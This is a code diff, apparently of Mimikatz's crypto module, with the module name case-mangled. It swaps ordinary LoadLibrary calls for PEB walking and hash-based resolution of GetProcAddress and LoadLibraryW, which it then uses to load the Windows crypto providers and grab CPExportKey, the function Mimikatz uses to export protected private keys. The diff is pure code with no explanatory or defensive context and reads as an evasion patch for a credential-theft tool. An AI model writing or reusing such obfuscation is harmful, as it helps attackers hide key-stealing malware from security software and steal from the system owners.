@@ -35,14 +35,25 @@ const KUHL_M kuhl_m_cRyPTO = {
 NTSTATUS kuhl_m_cRyPTO_init()
 {
 	NTSTATUS status = STATUS_NOT_FOUND;
-	DWORD hsh = getHashFromString("CPExportKey");
+	//DWORD h1 = getHashFromString("CPExportKey");
 
-	if (kuhl_m_cRyPTO_hRsaEnh = LoadLibrary(L"rsaenh")) {
-		K_RSA_CPExportKey = (PCP_EXPORTKEY)getFunctionByHash(kuhl_m_cRyPTO_hRsaEnh, hsh);
+	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"kernel32.dll");
+	FARPROC funcAddr = getFunctionByHash(hKernel32Base, H_GetProcAddress);
+	customGetProcAddress GetProcAddress_ = (customGetProcAddress)funcAddr;
+
+	FARPROC fpLoadLib = getFunctionByHash(hKernel32Base, H_LoadLibraryW);
+	customLoadLibraryW LoadLibraryW_ = (customLoadLibraryW)fpLoadLib;
+
+
+	//if (kuhl_m_cRyPTO_hRsaEnh = LoadLibrary(L"rsaenh")) {
+	if (kuhl_m_cRyPTO_hRsaEnh = LoadLibraryW_(L"rsaenh.dll")) {
+
+		K_RSA_CPExportKey = (PCP_EXPORTKEY)GetProcAddress_(kuhl_m_cRyPTO_hRsaEnh, "CPExportKey");
 	}
 
-	if (kuhl_m_cRyPTO_hDssEnh = LoadLibrary(L"dssenh")) {
-		K_DSS_CPExportKey = (PCP_EXPORTKEY)getFunctionByHash(kuhl_m_cRyPTO_hDssEnh, hsh);
+	//if (kuhl_m_cRyPTO_hDssEnh = LoadLibrary(L"dssenh")) {
+	if (kuhl_m_cRyPTO_hDssEnh = LoadLibraryW_(L"dssenh.dll")) {
+		K_DSS_CPExportKey = (PCP_EXPORTKEY)GetProcAddress_(kuhl_m_cRyPTO_hDssEnh, "CPExportKey");
 	}
 
 	if (K_RSA_CPExportKey && K_DSS_CPExportKey)
